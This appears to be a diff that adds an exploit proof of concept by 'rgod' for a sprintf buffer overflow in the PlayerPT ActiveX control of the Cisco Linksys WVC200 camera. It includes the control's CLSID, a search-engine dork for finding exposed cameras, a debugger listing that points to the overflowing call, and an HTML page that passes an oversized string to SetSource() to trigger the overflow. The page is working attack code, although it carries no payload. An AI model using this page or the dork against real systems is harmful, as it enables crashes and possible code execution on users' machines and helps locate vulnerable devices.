@@ -1,0 +1,51 @@
+<!--
+Cisco Linksys WVC200 Wireless-G PTZ Internet Video Camera PlayerPT ActiveX 
+Control PlayerPT.ocx sprintf Buffer Overflow Vulnerability
+
+when viewing the device web interface it asks
+to install an ActiveX control with the following settings:
+
+ProductName: PlayerPT ActiveX Control Module
+File version: 1.0.0.15
+Binary path: C:\WINDOWS\system32\PlayerPT.ocx
+CLSID: {9E065E4A-BD9D-4547-8F90-985DC62A5591}
+ProgID: PLAYERPT.PlayerPTCtrl.1
+Safe for scripting (registry): True
+Safe for initialization (registry): True
+
+try this google dork for WVC200:
+linksys wireless-g ptz inurl:main.cgi
+
+Vulnerability:
+the SetSource() method is vulnerable to a buffer overflow
+vulnerability. Quickly, ollydbg dump:
+
+...
+03238225   8B5424 20        mov edx,dword ptr ss:[esp+20]
+03238229   894424 10        mov dword ptr ss:[esp+10],eax
+0323822D   B9 32000000      mov ecx,32
+03238232   33C0             xor eax,eax
+03238234   8B72 F8          mov esi,dword ptr ds:[edx-8]
+03238237   8DBC24 E8020000  lea edi,dword ptr ss:[esp+2E8]
+0323823E   F3:AB            rep stos dword ptr es:[edi]
+03238240   8B3D 0C062603    mov edi,dword ptr ds:[<&MSVCRT.sprintf>] ; msvcrt.sprintf
+03238246   52               push edx
+03238247   8D8C24 EC020000  lea ecx,dword ptr ss:[esp+2EC]
+0323824E   68 48612603      push PlayerPT.03266148                   ; ASCII "%s"
+03238253   51               push ecx
+03238254   FFD7             call edi <---------------boom
+...
+
+rgod
+-->
+<!-- saved from url=(0014)about:internet --> 
+<HTML>
+<object classid='clsid:9E065E4A-BD9D-4547-8F90-985DC62A5591' id='obj' />
+</object>
+<script>
+var x="";
+for (i=0; i<13999; i++){
+    x = x + "aaaa";
+}
+obj.SetSource("","","","",x);
+</script>
